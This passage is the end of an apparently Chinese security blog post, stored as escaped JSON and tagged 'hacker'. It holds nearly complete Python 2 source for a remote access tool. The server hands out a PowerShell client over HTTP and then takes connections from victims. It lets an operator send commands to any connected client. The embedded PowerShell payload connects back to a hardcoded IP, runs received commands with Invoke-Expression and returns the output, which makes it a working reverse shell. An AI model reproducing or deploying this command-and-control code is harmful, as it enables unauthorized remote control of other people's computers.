str(i[1])\n                pk += 1\n        elif command.startswith(\"c\"):\n            try:\n                pk = int(command[2:]) - 1\n            except:\n                print \"usage:c <client_pk>\"\n\n            while 1:\n                try:\n                    msg = raw_input(\"control %s:%s> \" % (allAddresses[pk][0], allAddresses[pk][1]))\n                    allConnections[pk].send(msg)\n                    allConnections[pk].settimeout(5)\n                    result = allConnections[pk].recv(1024)\n                    result = result.decode('utf8')\n                    print result\n\n                except KeyboardInterrupt:\n                    print \"Catch C-c\"\n                    break\n                except Exception, e:\n                    print \"error:\" + str(e)\n                    break\n\n\n# Socket服务进程，如果Request里包含connect，用Http返回PowerShell客户端的代码\n# 如果Request不包含connect，说明是后续的TCP连接成功，添加进已连接的客户端数组\ndef service():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('', port))\n    sock.listen(5)\n    while 1:\n        try:\n            conn, addr = sock.accept()\n            conn.setblocking(1)\n            if conn:\n                request = conn.recv(23)\n            print request\n            if request.find(\"/connect\") > 0:\n                http_message(keep_connect(\"192.168.199.100\", port), conn)\n            else:\n                allConnections.append(conn)\n                allAddresses.append(addr)\n                print \"Connected with \" + addr[0] + \":\" + str(addr[1])\n        except Exception, e:\n            print \"error:\" + str(e)\n            break\n\n\n# PowerShell客户端的代码，与服务端用TCP连接，Iex执行接受的数据并返回执行结果\ndef keep_connect(ip, port):\n    message = '$client = New-Object System.Net.Sockets.TcpClient(\"%s\",%d)' % (ip, port)\n    message += '''\n                $stream = $client.GetStream()\n                [byte[]]$bytes = 0..65535|%{0}\n                if ($stream.CanWrite)\n                {\n                            $sendBytes = ([text.encoding]::ASCII).GetBytes(\"rat\")\n                            $stream.Write($sendBytes, 0, $sendBytes.Length)\n                            while (1)\n                            {\n                                 try{\n                                     $data = $stream.read($bytes, 0, $bytes.Length)\n                                     $EncodedText = New-Object -TypeName System.Text.UTF8Encoding\n                                     $info = $EncodedText.GetString($bytes,0, $data)\n                                     $sendback = (Invoke-Expression -Command $info 2>&1 | Out-String )\n                                     $sendbackBytes = ([text.encoding]::UTF8).GetBytes($sendback)\n                                     $stream.Write($sendbackBytes,0,$sendbackBytes.Length)\n                                     write($info)\n                                 }\n                                 catch\n                                 {\n                                     Write-Error $_\n                                     continue\n                                 }\n                            }\n                }\n                else\n                {       }\n\t      '''\n    return message\n\n\ndef http_message(msg, conn):\n    try:\n        httpHead = \"HTTP/1.1 200 OK\\r\\n\"\n        httpHead += \"Content-type: text/html; charset=utf-8\\r\\n\"\n        httpHead += \"Connection: Keep-Alive\\r\\n\"\n        httpHead += \"Server: test\\r\\n\"\n        httpHead += \"Content-Length: %d\\r\\n\" % len(msg)\n        httpHead += \"\\r\\n\"\n\n        conn.send(httpHead + msg)\n        return 1\n    except:\n        return 0\n\nif __name__ == '__main__':\n\tmain()\n```\n\t\n\t\n\t\n","tags":["python,powershell,hacker"],"categories":["安全"]}]